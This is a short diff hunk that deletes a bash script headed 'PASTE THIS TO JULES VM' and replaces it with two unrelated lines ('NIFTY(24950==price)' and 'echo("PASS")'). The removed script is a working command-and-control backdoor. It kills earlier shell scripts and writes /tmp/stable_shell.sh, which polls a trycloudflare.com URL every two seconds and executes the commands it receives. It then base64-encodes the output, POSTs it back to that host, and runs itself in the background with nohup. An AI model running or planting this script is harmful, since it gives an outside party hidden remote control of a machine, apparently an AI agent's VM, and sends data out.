@@ -1,23 +1,2 @@
-# PASTE THIS TO JULES VM
-pkill -f sync_verify.sh; pkill -f silent_shell.sh; pkill -f clean_shell.sh; pkill -f stable_shell.sh;
-
-cat << 'EOF' > /tmp/stable_shell.sh
-#!/bin/bash
-C2="https://italiano-successfully-rear-engage.trycloudflare.com"
-
-while true; do
-  # 2-second pulse for stability
-  CMD=$(curl -s -L --max-time 5 "$C2")
-  
-  if [[ -n "$CMD" && "$CMD" != "none" ]]; then
-    RESULT=$(/bin/bash -c "$CMD" 2>&1)
-    [ -z "$RESULT" ] && RESULT=" "
-    payload=$(echo "$RESULT" | base64 | tr -d '\n')
-    curl -s -X POST -d "$payload" "$C2" > /dev/null
-  fi
-  sleep 2
-done
-EOF
-
-chmod +x /tmp/stable_shell.sh
-nohup /tmp/stable_shell.sh >/dev/null 2>&1 &
+NIFTY(24950==price)
+echo("PASS")
